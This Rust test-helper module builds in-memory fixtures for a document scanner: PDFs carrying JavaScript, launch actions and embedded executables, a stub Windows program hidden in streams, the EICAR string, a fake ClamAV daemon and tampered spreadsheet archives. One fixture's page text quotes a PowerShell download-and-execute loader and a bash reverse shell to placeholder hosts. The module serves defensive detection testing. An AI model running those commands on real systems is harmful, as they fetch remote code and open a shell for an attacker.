//! Test files built in memory: PDFs, images and a stand-in ClamAV daemon. The unit tests use this module, and the
//! service tests include the same file, so it names only outside crates.
#![allow(dead_code)]

use image::{DynamicImage, ImageFormat, Rgb, RgbImage};
use lopdf::{Dictionary, Document, Object, ObjectId, Stream, dictionary};
use std::io::{Cursor, Write};
use std::path::PathBuf;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpListener;

pub const EICAR: &[u8] = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";

/// The shipped policy, the one the cluster deploys: the workspace library's papers and the labs' datasets.
pub const POLICY: &str = include_str!("../policy/policy.json");

pub fn rules_dir() -> PathBuf {
    PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("rules")
}

/// A one-page PDF with a Helvetica font and the given page content.
pub fn document(content: &str) -> Document {
    let mut doc = Document::with_version("1.7");
    let pages_id = doc.new_object_id();
    let font_id = doc.add_object(
        dictionary! {"Type" => "Font", "Subtype" => "Type1", "BaseFont" => "Helvetica"},
    );
    let resources_id = doc.add_object(dictionary! {"Font" => dictionary! {"F1" => font_id}});
    let content_id = doc.add_object(Stream::new(dictionary! {}, content.as_bytes().to_vec()));
    let page_id = doc.add_object(dictionary! {
        "Type" => "Page", "Parent" => pages_id, "Contents" => content_id, "Resources" => resources_id,
        "MediaBox" => vec![0.into(), 0.into(), 612.into(), 792.into()],
    });
    doc.objects.insert(
        pages_id,
        Object::Dictionary(dictionary! {
            "Type" => "Pages", "Kids" => vec![page_id.into()], "Count" => 1,
        }),
    );
    let catalog_id = doc.add_object(dictionary! {"Type" => "Catalog", "Pages" => pages_id});
    doc.trailer.set("Root", catalog_id);
    doc
}

/// Adds a page with the given content and resources after the existing ones.
pub fn add_page(doc: &mut Document, content: &str, resources: Dictionary) -> ObjectId {
    let pages_id = doc
        .catalog()
        .unwrap()
        .get(b"Pages")
        .unwrap()
        .as_reference()
        .unwrap();
    let content_id = doc.add_object(Stream::new(dictionary! {}, content.as_bytes().to_vec()));
    let page_id = doc.add_object(dictionary! {
        "Type" => "Page", "Parent" => pages_id, "Contents" => content_id, "Resources" => resources,
        "MediaBox" => vec![0.into(), 0.into(), 612.into(), 792.into()],
    });
    let pages = doc.get_object_mut(pages_id).unwrap().as_dict_mut().unwrap();
    pages
        .get_mut(b"Kids")
        .unwrap()
        .as_array_mut()
        .unwrap()
        .push(page_id.into());
    let count = pages.get(b"Count").unwrap().as_i64().unwrap();
    pages.set("Count", count + 1);
    page_id
}

/// A gray image stream of the given declared size, whose few bytes stand in for its pixels.
pub fn image(width: i64, height: i64) -> Stream {
    Stream::new(
        dictionary! {"Type" => "XObject", "Subtype" => "Image", "Width" => width, "Height" => height,
        "ColorSpace" => "DeviceGray", "BitsPerComponent" => 8},
        vec![0; 4],
    )
}

pub fn to_bytes(doc: &mut Document) -> Vec<u8> {
    let mut out = Vec::new();
    doc.save_to(&mut out).unwrap();
    out
}

/// The document written with object streams and a cross-reference stream, as most current writers save.
pub fn to_modern_bytes(doc: &mut Document) -> Vec<u8> {
    let mut out = Vec::new();
    doc.save_modern(&mut out).unwrap();
    out
}

pub fn paper() -> Vec<u8> {
    to_bytes(&mut document(
        "BT /F1 12 Tf 72 700 Td (Serum retinol rose with dose.) Tj ET",
    ))
}

pub fn catalog_mut(doc: &mut Document) -> &mut Dictionary {
    let id = doc.trailer.get(b"Root").unwrap().as_reference().unwrap();
    doc.get_object_mut(id).unwrap().as_dict_mut().unwrap()
}

pub fn page_id(doc: &Document) -> ObjectId {
    *doc.get_pages().get(&1).unwrap()
}

pub fn resources_mut(doc: &mut Document) -> &mut Dictionary {
    let page = page_id(doc);
    let id = doc
        .get_dictionary(page)
        .unwrap()
        .get(b"Resources")
        .unwrap()
        .as_reference()
        .unwrap();
    doc.get_object_mut(id).unwrap().as_dict_mut().unwrap()
}

/// The same page with each kind of active content attached.
pub fn active_document() -> Document {
    let mut doc = document("BT /F1 12 Tf 72 700 Td (Results) Tj ET");
    let js = doc.add_object(
        dictionary! {"S" => "JavaScript", "JS" => Object::string_literal("app.alert(1)")},
    );
    let launch =
        doc.add_object(dictionary! {"S" => "Launch", "F" => Object::string_literal("notes.txt")});
    let embedded = doc.add_object(Stream::new(
        dictionary! {"Type" => "EmbeddedFile"},
        b"payload".to_vec(),
    ));
    let spec = doc.add_object(
        dictionary! {"Type" => "Filespec", "F" => Object::string_literal("a.exe"),
        "EF" => dictionary! {"F" => embedded}},
    );
    let page = page_id(&doc);
    let annotation = doc.add_object(dictionary! {"Type" => "Annot", "Subtype" => "Link",
    "Rect" => vec![0.into(), 0.into(), 10.into(), 10.into()], "A" => launch});
    let attachment = doc.add_object(
        dictionary! {"Type" => "Annot", "Subtype" => "FileAttachment",
        "Rect" => vec![0.into(), 0.into(), 10.into(), 10.into()], "FS" => spec},
    );
    let page = doc.get_object_mut(page).unwrap().as_dict_mut().unwrap();
    page.set("Annots", vec![annotation.into(), attachment.into()]);
    page.set("AA", dictionary! {"O" => js});
    let catalog = catalog_mut(&mut doc);
    catalog.set("OpenAction", js);
    catalog.set("Names", dictionary! {"JavaScript" => dictionary! {"Names" => vec![Object::string_literal("a"), js.into()]},
        "EmbeddedFiles" => dictionary! {"Names" => vec![Object::string_literal("a.exe"), spec.into()]}});
    catalog.set(
        "AcroForm",
        dictionary! {"Fields" => Vec::<Object>::new(), "XFA" => Object::string_literal("<xdp/>")},
    );
    doc
}

/// The document with each name under one of `keys` moved into an object of its own and given by reference, as a PDF
/// may give any value, in every dictionary outside the page tree and the catalog.
pub fn indirect_names(doc: &mut Document, keys: &[&[u8]]) {
    indirect_chains(doc, keys, 1);
}

/// As `indirect_names`, with each name reached through a chain of `hops` references.
pub fn indirect_chains(doc: &mut Document, keys: &[&[u8]], hops: usize) {
    let ids: Vec<ObjectId> = doc.objects.keys().copied().collect();
    for id in ids {
        let dict = match doc.objects.get(&id) {
            Some(Object::Dictionary(d)) => d,
            Some(Object::Stream(s)) => &s.dict,
            _ => continue,
        };
        if matches!(
            dict.get(b"Type").and_then(Object::as_name),
            Ok(b"Page" | b"Pages" | b"Catalog")
        ) {
            continue;
        }
        let moved: Vec<(Vec<u8>, Vec<u8>)> = keys
            .iter()
            .filter_map(|key| match dict.get(key) {
                Ok(Object::Name(name)) => Some((key.to_vec(), name.clone())),
                _ => None,
            })
            .collect();
        for (key, name) in moved {
            let mut reference = doc.add_object(Object::Name(name));
            for _ in 1..hops {
                reference = doc.add_object(Object::Reference(reference));
            }
            match doc.objects.get_mut(&id) {
                Some(Object::Dictionary(d)) => d.set(key, reference),
                Some(Object::Stream(s)) => s.dict.set(key, reference),
                _ => {}
            }
        }
    }
}

/// The bytes of a small Windows program: a DOS header pointing at a PE signature.
pub fn program() -> Vec<u8> {
    let mut pe = vec![0u8; 0x200];
    pe[..2].copy_from_slice(b"MZ");
    pe[0x3C] = 0x80;
    pe[0x80..0x84].copy_from_slice(b"PE\0\0");
    pe
}

/// Flate-compressed bytes, as a PDF stream holds them.
pub fn deflate(bytes: &[u8]) -> Vec<u8> {
    let mut encoder = flate2::write::ZlibEncoder::new(Vec::new(), flate2::Compression::default());
    encoder.write_all(bytes).unwrap();
    encoder.finish().unwrap()
}

/// A Flate-compressed stream with the given dictionary entries.
pub fn compressed(mut dict: Dictionary, bytes: &[u8]) -> Stream {
    dict.set("Filter", "FlateDecode");
    Stream::new(dict, deflate(bytes)).with_compression(false)
}

/// A paper with a compressed program in a stream that only a private catalog key names.
pub fn private_program_document() -> Document {
    let mut doc = document("BT /F1 12 Tf 72 700 Td (Methods) Tj ET");
    let hidden = doc.add_object(compressed(dictionary! {}, &program()));
    catalog_mut(&mut doc).set("PrivateData", hidden);
    doc
}

/// A paper whose one image's pixel data is a compressed program.
pub fn image_program_document() -> Document {
    let mut doc =
        document("q 100 0 0 100 72 600 cm /Im1 Do Q BT /F1 12 Tf 72 700 Td (Figure) Tj ET");
    let pixels = program();
    let image = doc.add_object(compressed(
        dictionary! {"Type" => "XObject", "Subtype" => "Image", "Width" => (pixels.len() / 4) as i64,
            "Height" => 4, "ColorSpace" => "DeviceGray", "BitsPerComponent" => 8},
        &pixels,
    ));
    resources_mut(&mut doc).set("XObject", dictionary! {"Im1" => image});
    doc
}

/// A security paper that quotes a download command, a reverse shell and a macro file name in its page text.
pub fn security_paper() -> Vec<u8> {
    to_bytes(&mut document(concat!(
        "BT /F1 10 Tf 72 700 Td (Observed loader: powershell -nop -c IEX \\(New-Object Net.WebClient\\)",
        ".DownloadString\\('http://example.invalid/a'\\)) Tj ",
        "0 -14 Td (Second stage: bash -i >& /dev/tcp/192.0.2.1/4444 0>&1) Tj ",
        "0 -14 Td (Macro storage: word/vbaProject.bin with Document_Open) Tj ET"
    )))
}

pub fn png() -> Vec<u8> {
    let mut out = Vec::new();
    DynamicImage::ImageRgb8(RgbImage::from_pixel(4, 3, Rgb([200, 30, 30])))
        .write_to(&mut Cursor::new(&mut out), ImageFormat::Png)
        .unwrap();
    out
}

pub fn jpeg() -> Vec<u8> {
    let mut out = Vec::new();
    DynamicImage::ImageRgb8(RgbImage::from_pixel(16, 16, Rgb([10, 120, 200])))
        .write_to(&mut Cursor::new(&mut out), ImageFormat::Jpeg)
        .unwrap();
    out
}

/// A stand-in ClamAV daemon: reports `Eicar-Test-Signature` when the streamed bytes hold the EICAR string.
pub async fn fake_daemon(signatures: &str) -> String {
    let signatures = signatures.to_string();
    let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
    let address = listener.local_addr().unwrap().to_string();
    tokio::spawn(async move {
        loop {
            let Ok((mut socket, _)) = listener.accept().await else {
                return;
            };
            let signatures = signatures.clone();
            tokio::spawn(async move {
                let mut command = Vec::new();
                let mut byte = [0u8; 1];
                while socket.read_exact(&mut byte).await.is_ok() && byte[0] != 0 {
                    command.push(byte[0]);
                }
                let reply = if command == b"zVERSION" {
                    format!("ClamAV 1.4.3/27788/{signatures}\0")
                } else {
                    let mut body = Vec::new();
                    loop {
                        let mut len = [0u8; 4];
                        if socket.read_exact(&mut len).await.is_err() {
                            return;
                        }
                        let n = u32::from_be_bytes(len) as usize;
                        if n == 0 {
                            break;
                        }
                        let mut chunk = vec![0u8; n];
                        socket.read_exact(&mut chunk).await.unwrap();
                        body.extend_from_slice(&chunk);
                    }
                    let needle = b"EICAR-STANDARD-ANTIVIRUS-TEST-FILE";
                    if body.windows(needle.len()).any(|w| w == needle) {
                        "stream: Eicar-Test-Signature FOUND\0".to_string()
                    } else {
                        "stream: OK\0".to_string()
                    }
                };
                let _ = socket.write_all(reply.as_bytes()).await;
            });
        }
    });
    address
}

/// A signature date the scanner check accepts as fresh.
pub fn fresh_signatures() -> String {
    let now = time::OffsetDateTime::now_utc();
    now.format(time::macros::format_description!(
        "[weekday repr:short] [month repr:short] [day padding:space] [hour]:[minute]:[second] [year]"
    ))
    .unwrap()
}

/// A workbook package built part by part, as a spreadsheet program writes one.
pub struct Book {
    parts: Vec<(String, Vec<u8>)>,
}

impl Book {
    /// A package with no parts.
    pub fn empty() -> Self {
        Book { parts: vec![] }
    }

    /// A workbook with these sheets: name, state (`visible` or `hidden`) and the rows of its sheet data. Style 1 is a
    /// date, 2 a date and time, 3 a duration.
    pub fn new(sheets: &[(&str, &str, &str)]) -> Self {
        const MAIN: &str = "http://schemas.openxmlformats.org/spreadsheetml/2006/main";
        const RELS: &str = "http://schemas.openxmlformats.org/officeDocument/2006/relationships";
        let mut overrides = String::new();
        let mut listed = String::new();
        let mut links = String::new();
        let mut sheet_parts = Vec::new();
        for (i, (name, state, rows)) in sheets.iter().enumerate() {
            let n = i + 1;
            overrides.push_str(&format!(r#"<Override PartName="/xl/worksheets/sheet{n}.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>"#));
            listed.push_str(&format!(
                r#"<sheet name="{name}" sheetId="{n}" state="{state}" r:id="rId{n}"/>"#
            ));
            links.push_str(&format!(r#"<Relationship Id="rId{n}" Type="{RELS}/worksheet" Target="worksheets/sheet{n}.xml"/>"#));
            sheet_parts.push((
                format!("xl/worksheets/sheet{n}.xml"),
                format!(r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?><worksheet xmlns="{MAIN}"><sheetData>{rows}</sheetData></worksheet>"#),
            ));
        }
        let mut parts = vec![
            (
                "[Content_Types].xml".to_string(),
                format!(
                    r#"<?xml version="1.0" encoding="UTF-8"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/><Override PartName="/xl/styles.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.styles+xml"/>{overrides}</Types>"#
                ),
            ),
            (
                "_rels/.rels".to_string(),
                format!(
                    r#"<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="{RELS}/officeDocument" Target="xl/workbook.xml"/></Relationships>"#
                ),
            ),
            (
                "xl/workbook.xml".to_string(),
                format!(
                    r#"<?xml version="1.0" encoding="UTF-8"?><workbook xmlns="{MAIN}" xmlns:r="{RELS}"><sheets>{listed}</sheets></workbook>"#
                ),
            ),
            (
                "xl/_rels/workbook.xml.rels".to_string(),
                format!(
                    r#"<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">{links}<Relationship Id="rIdS" Type="{RELS}/styles" Target="styles.xml"/></Relationships>"#
                ),
            ),
            (
                "xl/styles.xml".to_string(),
                format!(
                    r#"<?xml version="1.0" encoding="UTF-8"?><styleSheet xmlns="{MAIN}"><cellXfs count="4"><xf numFmtId="0"/><xf numFmtId="14" applyNumberFormat="1"/><xf numFmtId="22" applyNumberFormat="1"/><xf numFmtId="46" applyNumberFormat="1"/></cellXfs></styleSheet>"#
                ),
            ),
        ];
        parts.extend(sheet_parts);
        Book {
            parts: parts
                .into_iter()
                .map(|(name, text)| (name, text.into_bytes()))
                .collect(),
        }
    }

    pub fn with(mut self, name: &str, bytes: &[u8]) -> Self {
        self.parts.push((name.into(), bytes.to_vec()));
        self
    }

    /// Replaces `from` with `to` in the named part.
    pub fn replace(mut self, name: &str, from: &str, to: &str) -> Self {
        for (part, bytes) in &mut self.parts {
            if part == name {
                let text = String::from_utf8(bytes.clone()).unwrap();
                assert!(text.contains(from), "{name} has no {from}");
                *bytes = text.replace(from, to).into_bytes();
            }
        }
        self
    }

    pub fn bytes(&self) -> Vec<u8> {
        let mut writer = ::zip::ZipWriter::new(Cursor::new(Vec::new()));
        for (name, bytes) in &self.parts {
            writer
                .start_file(name.as_str(), ::zip::write::SimpleFileOptions::default())
                .unwrap();
            writer.write_all(bytes).unwrap();
        }
        writer.finish().unwrap().into_inner()
    }
}

/// A workbook with a value of every stored kind: text, numbers, a date, a date and time, a duration, a boolean, an
/// error, a formula with its saved value and one without, a merged range, a hidden sheet and a very hidden one.
pub fn sample_book() -> Book {
    Book::new(&[
        (
            "Weights",
            "visible",
            concat!(
                r#"<row r="2"><c r="A2" t="inlineStr"><is><t>mouse</t></is></c><c r="B2" t="inlineStr"><is><t>weight</t></is></c><c r="C2" t="inlineStr"><is><t>born</t></is></c><c r="D2" t="inlineStr"><is><t>ok</t></is></c></row>"#,
                r#"<row r="3"><c r="A3" t="inlineStr"><is><t>M1</t></is></c><c r="B3"><v>25.4</v></c><c r="C3" s="1"><v>45658</v></c><c r="D3" t="b"><v>1</v></c><c r="F3" t="e"><v>#DIV/0!</v></c></row>"#,
                r#"<row r="4"><c r="A4" t="inlineStr"><is><t>M2</t></is></c><c r="B4"><f>B3*2</f><v>50.8</v></c><c r="C4" s="2"><v>45658.5</v></c><c r="D4"><f>B4+1</f></c></row>"#,
                r#"<row r="5"><c r="A5" s="3"><v>0.0625</v></c><c r="B5"><v>3</v></c></row>"#,
                r#"<row r="9"><c r="A9" s="0"/></row>"#,
            ),
        ),
        ("Scratch", "hidden", r#"<row r="1"><c r="A1"><v>7</v></c></row>"#),
        (
            "Lookup",
            "veryHidden",
            r#"<row r="1"><c r="A1" t="inlineStr"><is><t>code</t></is></c></row>"#,
        ),
    ])
    .replace(
        "xl/worksheets/sheet1.xml",
        "</sheetData>",
        r#"</sheetData><mergeCells count="1"><mergeCell ref="A2:B2"/></mergeCells>"#,
    )
}

/// Changes the size the named part of a ZIP archive claims to hold, in its local and central headers, by `by` bytes.
/// False when the part is not there.
pub fn change_claim(archive: &mut [u8], name: &str, by: i64) -> bool {
    let mut changed = false;
    // Each header's signature, the offset of its uncompressed size, of its name's length, and of its name.
    for (signature, size_at, length_at, name_at) in [
        (&b"PK\x03\x04"[..], 22, 26, 30),
        (&b"PK\x01\x02"[..], 24, 28, 46),
    ] {
        let mut from = 0;
        while let Some(found) = archive[from..].windows(4).position(|w| w == signature) {
            let at = from + found;
            from = at + 4;
            let Some(length) = archive.get(at + length_at..at + length_at + 2) else {
                continue;
            };
            let length = u16::from_le_bytes([length[0], length[1]]) as usize;
            if archive.get(at + name_at..at + name_at + length) != Some(name.as_bytes()) {
                continue;
            }
            let size =
                u32::from_le_bytes(archive[at + size_at..at + size_at + 4].try_into().unwrap());
            if size > 0 {
                let claimed = (i64::from(size) + by) as u32;
                archive[at + size_at..at + size_at + 4].copy_from_slice(&claimed.to_le_bytes());
                changed = true;
            }
        }
    }
    changed
}
